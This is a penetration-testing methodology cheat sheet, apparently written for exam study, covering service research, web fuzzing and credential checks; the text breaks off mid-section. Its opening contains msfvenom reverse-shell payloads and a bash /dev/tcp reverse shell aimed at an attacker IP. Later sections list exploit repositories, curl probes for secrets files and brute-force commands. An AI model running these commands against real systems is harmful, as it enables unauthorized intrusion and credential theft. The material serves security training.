# Vulnerability Assessment & Web Testing

## üéØ Goal

Transform raw enumeration data into concrete, testable vulnerabilities

---

## Table of Contents

1. [Service Documentation & Research](#21-service-documentation-initial-research)
2. [Manual Vulnerability Identification](#22-manual-vulnerability-identification)
3. [Web Application Vulnerability Testing](#23-web-application-vulnerability-testing)
4. [Automated Scanning](#24-automated-scanning-support-role)
5. [Service-Specific Vulnerability Checks](#25-service-specific-vulnerability-checks)
6. [Building the Exploitation Plan](#26-building-the-exploitation-plan)
7. [Pre-Exploitation Checklist](#27-pre-exploitation-checklist)
8. [Quick Reference Resources](#28-quick-reference-resources)


---

## üìã Phase Checklist

### üñ•Ô∏è For Each Host/Application

#### Service Documentation


- [ ]¬†**Quick search for known CVEs**¬†‚Üí¬†[2.1.1](#211-cve-research)
- [ ]¬†**Default credentials researched**¬†‚Üí¬†[2.2.2](#222-default-credential-checks-targeted-approach)
- [ ]¬†**Common misconfigurations identified**¬†‚Üí¬†[2.2.1](#221-http-method-configuration-checks)

#### Web Applications

- [ ]¬†**Directory & content discovery completed**¬†‚Üí¬†[2.3.1](#231-directory-content-discovery)
- [ ]¬†**SQL Injection testing performed**¬†‚Üí¬†[2.3.2](#232-sql-injection-manual-testing-first)
- [ ]¬†**Command Injection testing performed**¬†‚Üí¬†[2.3.3](#233-command-injection)
- [ ]¬†**File Upload vulnerabilities tested**¬†‚Üí¬†[2.3.4](#234-file-upload-vulnerabilities)
- [ ]¬†**Path Traversal/LFI/RFI tested**¬†‚Üí¬†[2.3.5](#235-path-traversal-lfirfi)
- [ ]¬†**XSS vulnerabilities tested**¬†‚Üí¬†[2.3.6](#236-xss-cross-site-scripting)
- [ ]¬†**Advanced vulnerabilities tested**¬†(XXE, SSRF, SSTI, IDOR) ‚Üí¬†[2.3.7](#237-advanced-vulnerability-classes)
- [ ]¬†**Authentication & authorization tested**¬†‚Üí¬†[2.3.8](#238-authentication-authorization-testing)
- [ ]¬†**Strategic automated scanning completed**¬†(Nikto/Nuclei) ‚Üí¬†[2.4](#24-automated-scanning-support-role)

#### Network Services

- [ ]¬†**FTP anonymous access & permissions checked**¬†‚Üí¬†[2.5.1](#251-ftp-service-port-21)
- [ ]¬†**SSH version & algorithms checked**¬†‚Üí¬†[2.5.2](#252-ssh-service-port-22)
- [ ]¬†**SMB shares enumerated & vulnerable checks**¬†‚Üí¬†[2.5.3](#253-smbnetbios-services-ports-139-445)
- [ ]¬†**Database services tested for weak auth**¬†‚Üí¬†[2.5.4](#254-database-services)
- [ ]¬†**Email services enumerated**¬†‚Üí¬†[2.5.5](#255-email-services)
- [ ]¬†**Web servers checked for misconfigurations**¬†‚Üí¬†[2.5.6](#256-web-server-specific)
- [ ]¬†**Network protocols tested**¬†(SNMP, NFS, RDP, LDAP, RMI) ‚Üí¬†[2.5.7](#257-network-services)
- [ ]¬†**Default credentials tested**¬†(where allowed) ‚Üí¬†[2.2.2](#222-default-credential-checks-targeted-approach)
- [ ]¬†**Sensitive files/configs verified**¬†‚Üí¬†[2.2.1](#221-http-method-configuration-checks)

#### Documentation

- [ ]¬†**All vulnerabilities documented with clear descriptions**¬†‚Üí¬†[2.6.2](#262-vulnerability-documentation-template)
- [ ]¬†**Evidence captured**¬†(responses, errors, behavior) ‚Üí¬†[2.6.2](#262-vulnerability-documentation-template)
- [ ]¬†**References collected**¬†(PayloadsAllTheThings, CVEs, docs) ‚Üí¬†[2.6.2](#262-vulnerability-documentation-template)
- [ ]¬†**Vulnerabilities prioritized by severity**¬†‚Üí¬†[2.6.1](#261-vulnerability-prioritization-matrix)

#### Exploitation Planning

- [ ]¬†**Attack chains identified**¬†‚Üí¬†[2.6.3](#263-attack-chain-planning)
- [ ]¬†**Primary attack path defined**¬†‚Üí¬†[2.6.3](#263-attack-chain-planning)
- [ ]¬†**Backup attack paths documented**¬†‚Üí¬†[2.6.3](#263-attack-chain-planning)
- [ ]¬†**Prioritized list of \"likely footholds\" created**¬†‚Üí¬†[2.6.1](#261-vulnerability-prioritization-matrix)
- [ ]¬†**Required tools and payloads prepared**¬†‚Üí¬†[2.6.3](#263-attack-chain-planning)

---

## üõ†Ô∏è Quick Setup Commands

```bash
# Terminal 1: Listener
rlwrap nc -lvnp 4444

# Terminal 2: HTTP server for payloads
cd /opt/shells && python3 -m http.server 80

# Terminal 3: SMB server (Windows targets)
impacket-smbserver share . -smb2support

# Common payload generation
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
```

---

### ‚ö° One-Liner Cheat Sheet

```bash
# Quick vulnerability scan
nmap --script vuln <IP>

# Fast web directory scan
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/ -t 50

# SMB quick check
netexec smb <IP> -u '' -p '' --shares

# Check for EternalBlue
nmap --script smb-vuln-ms17-010 <IP>

# Generate quick reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
```

---

## üìö Essential Bookmarks

| Resource | URL | Use Case |
|----------|-----|----------|
| PayloadsAllTheThings | swisskyrepo.github.io/PayloadsAllTheThings/ | All payload types |
| HackTricks | book.hacktricks.xyz | Comprehensive methodology |
| GTFOBins | gtfobins.github.io | Linux privilege escalation |
| LOLBAS | lolbas-project.github.io | Windows living-off-the-land |
| RevShells | revshells.com | Reverse shell generator |
| CyberChef | gchq.github.io/CyberChef | Encoding/decoding |
| Exploit-DB | exploit-db.com | Public exploits |

---

## üîß Wordlist Locations

```bash
# Directory/file discovery
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Password lists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# Username lists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Fuzzing
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```
---

## 2.1 Service Documentation & Initial Research

### 2.1.1 üîç CVE Research

```bash
# Search for service vulnerabilities
searchsploit <SERVICE> <VERSION>
searchsploit -m <EDB-ID>  # Mirror exploit locally
searchsploit -x <EDB-ID>  # Examine exploit
searchsploit -w <EDB-ID>  # Get online URL

# Update searchsploit database
searchsploit -u

# Search with case-insensitive
searchsploit -i <SERVICE>

# Alternative CVE databases (web search)
# https://cve.mitre.org/
# https://nvd.nist.gov/
# https://www.exploit-db.com/
# https://packetstormsecurity.com/
```

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| CVE-2024-49138 | Windows Common Log File System Driver LPE | https://github.com/MrAle98/CVE-2024-49138-POC |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (1) | https://github.com/ThemeHackers/CVE-2025-24071 |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (2) | https://github.com/0x6rss/CVE-2025-24071_PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
| CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
| CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
| CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
| CVE-2025-62215 | Windows Kernel LPE | https://github.com/dexterm300/CVE-2025-62215-exploit-poc |
| CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
| n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | RustPotato LPE | https://github.com/safedv/RustPotato |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | bin-sploits | https://gitlab.com/exploit-database/exploitdb-bin-sploits |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |


### 2.1.2 üìù Version Fingerprinting

```bash
# Banner grabbing
nc -nv <IP> <PORT>
telnet <IP> <PORT>

# HTTP server identification
curl -I http://<IP>/
curl -s -D- http://<IP>/ -o /dev/null
curl -v http://<IP>/ 2>&1 | grep -E "Server:|X-Powered-By:"

# Detailed HTTP headers and technologies
whatweb http://<IP>/ -v
whatweb http://<IP>/ --color=never --no-errors -a 3

# TLS/SSL certificate information
openssl s_client -connect <IP>:443 < /dev/null
openssl s_client -connect <IP>:443 -showcerts < /dev/null

# SSL/TLS vulnerability scanning
sslyze --regular <IP>:443
nmap --script ssl-enum-ciphers,ssl-cert <IP> -p 443
```

---

## 2.2 Manual Vulnerability Identification

### 2.2.1 üåê HTTP Method & Configuration Checks

```bash
# üîé Allowed methods discovery
curl -X OPTIONS -i http://<IP>/
curl -v -X OPTIONS http://<IP>/

# ‚ö†Ô∏è Test dangerous methods
curl -X PUT http://<IP>/test.txt -d "test payload"
curl -X DELETE http://<IP>/test.txt
curl -X TRACE http://<IP>/
curl -X TRACK http://<IP>/

# Test for WebDAV
davtest -url http://<IP>/
davtest -url http://<IP>/webdav/
cadaver http://<IP>/

# Nmap WebDAV detection
nmap --script http-webdav-scan <IP> -p 80,443
```

**üìÅ Common Config Files to Check:**

```bash
# Web server configs
curl http://<IP>/web.config
curl http://<IP>/.htaccess
curl http://<IP>/httpd.conf
curl http://<IP>/apache2.conf
curl http://<IP>/nginx.conf
curl http://<IP>/server-status
curl http://<IP>/server-info

# Application configs  
curl http://<IP>/config.php
curl http://<IP>/.env
curl http://<IP>/.env.local
curl http://<IP>/.env.backup
curl http://<IP>/.env.prod
curl http://<IP>/config.json
curl http://<IP>/config.yml
curl http://<IP>/settings.php
curl http://<IP>/configuration.php
curl http://<IP>/database.yml
curl http://<IP>/config.ini

# WordPress specific
curl http://<IP>/wp-config.php
curl http://<IP>/wp-config.php.bak
curl http://<IP>/wp-config.php~

# Information disclosure
curl http://<IP>/phpinfo.php
curl http://<IP>/info.php
curl http://<IP>/test.php
curl http://<IP>/admin.php
curl http://<IP>/debug.php
curl http://<IP>/backup.zip
curl http://<IP>/backup.sql
curl http://<IP>/db_backup.sql
curl http://<IP>/.git/config
curl http://<IP>/.git/HEAD
curl http://<IP>/.svn/entries
curl http://<IP>/.hg/
curl http://<IP>/.bzr/

# Common backup files
curl http://<IP>/index.php.bak
curl http://<IP>/index.php~
curl http://<IP>/index.php.old
curl http://<IP>/index.php.orig
curl http://<IP>/index.php.save
curl http://<IP>/web.config.bak
curl http://<IP>/backup/
curl http://<IP>/backups/
curl http://<IP>/old/

# Robot and sitemap files
curl http://<IP>/robots.txt
curl http://<IP>/sitemap.xml
curl http://<IP>/sitemap_index.xml

# Common API endpoints
curl http://<IP>/api/
curl http://<IP>/api/v1/
curl http://<IP>/api/v2/
curl http://<IP>/rest/
curl http://<IP>/graphql
```

### 2.2.2 üîë Default Credential Checks (Targeted Approach)

**üéØ Common Admin Panels:**

```
/admin
/administrator
/admin.php
/admin.html
/admin/
/wp-admin
/wp-login.php
/phpmyadmin
/phpMyAdmin
/pma
/manager/html (Tomcat)
/host-manager/html (Tomcat)
/console (JBoss)
/admin-console
/cpanel
/webmail
/login
/login.php
Router/camera management interfaces
Database administration consoles
```

**üß™ Common Credential Combinations:**

```
admin:admin
admin:password
admin:Password123
admin:admin123
admin:pass
admin:root
admin:[empty]
administrator:administrator
administrator:password
root:root
root:toor
root:password
root:admin
guest:guest
user:user
test:test
tomcat:tomcat
tomcat:s3cret
admin:password123
admin:123456
admin:admin1
sa:[empty] (MSSQL)
postgres:postgres
mysql:mysql
oracle:oracle
```

**üîç Credential Testing Tools:**

```bash
# Hydra - Multiple protocols
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin

# SSH brute forcing (use carefully)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# NetExec (formerly CrackMapExec) - SMB/WinRM/MSSQL
netexec smb <IP> -u admin -p /usr/share/wordlists/rockyou.txt
netexec smb <IP> -u '' -p '' --shares  # Null session
netexec smb <IP> -u guest -p '' --shares  # Guest access
netexec winrm <IP> -u admin -p password
netexec mssql <IP> -u sa -p '' --local-auth

# Medusa - Alternative to Hydra
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

> ‚ö†Ô∏è¬†**Warning**: Avoid aggressive brute-forcing; use context-aware guesses first. Check exam restrictions on authentication attacks. Account lockout policies may trigger.

---

## 2.3 Web Application Vulnerability Testing

**üìö Essential Resources (Keep Open):**

- [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### 2.3.1 üîç Directory & Content Discovery

#### Gobuster

```bash
# Basic directory enumeration
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/

# With file extensions
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<IP>/ -x php,txt,html,bak

# Full URL display with status codes
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<IP>/ -x php,txt,html,js -e -s "200,204,301,302,307,401,403"

# Common extensions for different technologies
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/ -x php,html,txt,pdf,zip,bak,old,tar,gz

# Lowercase wordlist (bypass some filters)
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<IP>/ -k --wildcard

# API endpoint discovery
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://<IP>/api/ -e -s 200

# With authentication (cookies)
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/ -c "PHPSESSID=abc123"

# With authentication (basic auth)
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/ -U admin -P password

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host discovery
gobuster vhost -u http://<IP>/ -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Useful Gobuster flags:
# -e    Extended mode that renders the full URL
# -k    Skip SSL certificate validation
# -r    Follow redirects
# -s    Positive status codes (default "200,204,301,302,307,401,403")
# -b    Negative status codes (exclude)
# -t    Number of concurrent threads (default 10)
# -o    Output file
# --wildcard    Continue if wildcard response detected
# -n    Don't print status codes
# -q    Don't print the banner and other noise
```

#### FFUF (Fast Web Fuzzer)

```bash
# Basic directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ

# With extensions
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -e .php,.html,.txt,.pdf,.zip

# Filter by size (eliminate false positives)
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -fs 1234

# Filter by word count
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -fw 42

# Filter by line count
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -fl 20

# Match specific status codes with output
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -mc 200,204,301,302,307,401,403 -o results.txt -of json

# Colorized output with auto-calibration
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -ac

# Virtual host discovery with auto-calibration
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.example.com" -u http://<IP>/ -ac

# Virtual host with size filter
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.example.com" -u http://<IP>/ -fs 185

# Date/numeric fuzzing (backup files, year ranges)
ffuf -c -w <(seq 2015 2024) -u http://<IP>/backups/backup_FUZZ.zip
ffuf -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<IP>/backups/backup_2024070416FUZZ.zip

# API fuzzing
ffuf -u https://<IP>/api/v2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -c -ac -t 250 -fc 400,404,412

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<IP>/admin.php?FUZZ=test -fs 1234 -mc all

# POST data fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/login.php -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fc 401

# LFI fuzzing
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<IP>/index.php?page=FUZZ -fs 15349

# Fuzzing with cookies/session
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u "http://<IP>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644

# Recursion mode (careful - can be slow)
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<IP>/FUZZ -recursion -recursion-depth 2

# File extension discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<IP>/logs/FUZZ -e .log,.txt,.bak

# Rate limiting (requests per second)
